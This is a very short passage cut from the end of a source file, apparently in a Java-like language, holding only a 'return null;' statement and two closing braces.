		return null;
	}
}
